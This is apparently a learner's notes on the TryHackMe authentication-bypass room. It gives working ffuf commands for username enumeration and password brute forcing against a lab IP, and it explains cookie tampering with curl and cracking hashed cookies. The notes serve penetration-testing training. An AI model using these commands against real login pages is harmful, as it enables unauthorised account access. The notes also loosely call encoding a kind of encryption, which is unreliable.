# Step 1: Getting Usernames

You can figure out how to get accounts by brute forcing usernames. 
If you try registering an account under "admin" and it already exists, you'll know its real. We can automatet this using error messages like "this username already exists". 


In less stupid terms, its called: **Username Enumeration**


You can do this using **FFUF** tool**

FFUF Ex:


```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.36.158/customers/signup -mr "username already exists"
```

# Step 2: Bruteforce passwords

Tryhackme only talks about ffuf for bruteforcing passwords... Yawn...

Maybe they have other units about password cracking web forms... idk...

Anywho, heres the example:

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.36.158/customers/login -fc 200
```

# Logic flaws

## What

These are issues in a computers logic that can be exploited by hackers. 

## Curl can be helpful
Just look at the unit

https://tryhackme.com/room/authenticationbypass

# Cookie tampering

We can manipulate cookies to make it seem like we are authenticated. 

Curl is helpful here, as we can use the -H tag to add headers that make it seem like we're logged in with a valid cookie

## Hashing

Sometimes these cookies are hashed, heres some common hashes:

| Original String | Hash Method | Output |
| -------- | -------- | -------- |
| 1 | md5 | c4ca4238a0b923820dcc509a6f75849b |
| 1 | sha-256 | 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b |
| 1 | sha-512 | 4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a |
| 1 | sha1 | 356a192b7913b04c54574d18c28d46e6395428ab |

Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.


## Encoding

Encoding is like hashing, where cookies are encrypted, except its *<mark>reversible</mark>*

This can help with base coding and uncoding, allowing us to spoof cookies

Sites for encoding/decoding:

- https://www.base64decode.org/
- https://www.base64encode.org/